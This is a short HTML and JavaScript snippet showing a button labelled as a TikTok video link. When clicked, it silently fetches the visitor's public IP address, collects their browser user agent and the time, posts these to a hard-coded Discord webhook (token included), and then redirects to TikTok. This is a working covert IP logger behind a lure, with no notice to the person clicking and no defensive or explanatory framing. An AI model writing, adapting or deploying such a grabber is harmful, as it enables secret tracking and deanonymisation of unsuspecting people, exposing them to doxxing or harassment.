<button onclick="sendWebhook()">ðŸŽ¯ Watch TikTok Video</button>

<script>
function sendWebhook() {
  const webhook = 'https://discord.com/api/webhooks/1406106788331389038/IxEz1eV6kbDWbwXT8pmP2aqZJF__NYJnHKek36vo6s6XYoPQMm5tKct1AbHxj_BdMW3p';
  const tiktok = 'https://vt.tiktok.com/ZSA11Pxxq/';
  
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(ipData => {
      const ip = ipData.ip || 'Unknown';
      const device = navigator.userAgent;

      // Send only the clicked link, time, device, and IP
      const message = `ðŸŽ¯ TikTok link clicked!\nVideo: ${tiktok}\nTime: ${new Date().toLocaleString()}\nIP: ${ip}\nDevice: ${device}`;

      fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
      }).catch(err => console.log('Webhook failed:', err));

      // Redirect user
      window.location.href = tiktok;
    })
    .catch(() => {
      window.location.href = tiktok;
    });
}
</script>

